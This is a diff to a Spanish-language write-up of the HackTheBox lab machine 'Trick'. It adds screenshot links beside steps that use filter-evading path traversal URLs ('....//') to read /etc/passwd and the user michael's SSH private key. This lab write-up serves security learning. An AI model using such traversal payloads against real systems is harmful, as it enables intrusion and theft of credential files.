@@ -147,12 +147,18 @@ Vamos a probar unas técnicas de evasión. Para ello le añadiremos ....//....//
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//etc/passwd
 ```
 Y en este caso hemos conseguido leer el archivo /etc/passwd.
+
+![passwd](images/19_passwd.png)
+
 Ahora lo que necesitamos es ejecutar remotamente comandos o ganar directamente acceso al sistema.
 Para ello intentaremos robar la clave id_rsa del usuario michael que hemos visto en el archivo /etc/passwd
 
 ```bash
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa
 ```
+
+![id_rsa2](images/20_id_rsa_desord.png)
+
 La vemos pero está desordenada, para ello hacemos un view-source de la url de la siguiente forma
 
 ```bash
